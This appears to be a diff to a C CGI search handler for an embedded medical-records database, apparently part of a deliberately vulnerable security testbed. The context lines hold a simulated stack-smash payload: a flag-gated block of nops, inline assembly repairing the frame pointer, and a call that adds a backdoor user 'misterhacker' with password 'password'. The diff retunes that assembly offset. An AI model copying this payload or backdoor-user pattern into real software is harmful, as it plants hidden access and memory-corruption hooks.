@@ -41,8 +41,13 @@
 
 
 database_search_result_t * GetSearchResult( char *cgistr );
-
 CGI_FUNCTION(BaseType_t, ShowSearchResult, database_search_result_t *search_result);
+
+static char type[2] = { 0 };
+static char first_name[USER_NAME_LENGTH] = { 0 };
+static char last_name[USER_NAME_LENGTH] = { 0 };
+static char address[USER_ADDRESS_LENGTH] = { 0 };
+static char condition[MEDICAL_NAME_LENGTH] = { 0 };
 
 int not_stack_smash = 0;
 
@@ -67,8 +72,7 @@ BaseType_t CgiSearchResults( char *pcWriteBuffer, size_t xWriteBufferLen,
   return CGI_IMPL_CALL(ShowSearchResult, search_result);
 }
 
-void ParseSearchCgiString(char *pcCgiArgs, char *type, char *first_name,
-			 char *last_name, char *address, char *condition) {
+void ParseSearchCgiString(char *pcCgiArgs) {
 
   char ltype[2] = { 0 };
   char lfirst_name[USER_NAME_LENGTH] = { 0 };
@@ -99,16 +103,10 @@ void ParseSearchCgiString(char *pcCgiArgs, char *type, char *first_name,
 database_search_result_t *
 GetSearchResult( char *cgistr )
 {
-  char type[2] = { 0 };
-  char first_name[USER_NAME_LENGTH] = { 0 };
-  char last_name[USER_NAME_LENGTH] = { 0 };
-  char address[USER_ADDRESS_LENGTH] = { 0 };
-  char condition[MEDICAL_NAME_LENGTH] = { 0 };
-
   database_search_result_t *search_result;
   user_type_t search_type;
 
-  ParseSearchCgiString(cgistr, type, first_name, last_name, address, condition);
+  ParseSearchCgiString(cgistr);
   if(not_stack_smash) {
     __asm("nop");
     __asm("nop");
@@ -160,7 +158,7 @@ GetSearchResult( char *cgistr )
     __asm("nop");
     __asm("nop");
     __asm("nop");
-    __asm("addi s0, sp, 336");
+    __asm("addi s0, sp, 96");
     printf("Executing payload...\n");
     DatabaseAddUser(UserCreate("misterhacker", "password", "Mister", "Hacker", "555 Technology Square"));
   }
